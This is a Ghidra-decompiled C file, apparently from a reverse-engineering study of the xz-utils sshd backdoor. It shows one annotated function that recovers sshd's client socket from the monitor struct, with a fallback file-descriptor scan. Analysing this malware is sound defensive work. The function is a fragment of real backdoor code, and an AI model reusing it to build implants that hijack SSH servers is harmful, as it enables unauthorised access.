// /home/kali/xzre-ghidra/xzregh/107C60_sshd_get_client_socket.c
// Function: sshd_get_client_socket @ 0x107C60
// Calling convention: unknown
// Prototype: undefined sshd_get_client_socket(void)


/*
 * AutoDoc: Prefers using the recovered monitor struct: depending on DIR_READ/DIR_WRITE it fetches
 * monitor->m_sendfd or m_recvfd, verifies the fd by issuing a zero-length read that tolerates
 * EINTR, and returns it on success. If the monitor pointer is missing or the fd is bad/EBADF it
 * falls back to `sshd_get_usable_socket`'s fd scanner.
 */
#include "xzre_types.h"


undefined8 sshd_get_client_socket(long param_1,int *param_2,undefined4 param_3,int param_4)

{
  int iVar1;
  int iVar2;
  undefined8 uVar3;
  int *piVar4;
  long lVar5;
  int *errno_ptr;
  int client_fd;
  
  if (((param_1 == 0) || (lVar5 = *(long *)(param_1 + 0x10), lVar5 == 0)) || (param_2 == (int *)0x0)
     ) {
    return 0;
  }
  if (*(undefined8 **)(param_1 + 0x48) != (undefined8 *)0x0) {
    piVar4 = (int *)**(undefined8 **)(param_1 + 0x48);
    iVar1 = is_range_mapped(piVar4,4,param_1);
    if (iVar1 != 0) {
      if (param_4 == 0) {
        iVar1 = *piVar4;
      }
      else {
        if (param_4 != 1) {
          return 0;
        }
        iVar1 = piVar4[1];
      }
      client_fd._0_1_ = 0;
      lVar5 = *(long *)(param_1 + 0x10);
      if (((-1 < iVar1) && (lVar5 != 0)) &&
         ((*(long *)(lVar5 + 0x48) != 0 && (*(long *)(lVar5 + 0x50) != 0)))) {
        do {
          iVar2 = (**(code **)(lVar5 + 0x48))(iVar1,&client_fd,0);
          piVar4 = (int *)(**(code **)(lVar5 + 0x50))();
          if (-1 < iVar2) goto LAB_00107d34;
        } while (*piVar4 == 4);
        if (*piVar4 != 9) {
LAB_00107d34:
          *param_2 = iVar1;
          return 1;
        }
      }
    }
    lVar5 = *(long *)(param_1 + 0x10);
  }
  uVar3 = sshd_get_usable_socket(param_2,param_3,lVar5);
  return uVar3;
}

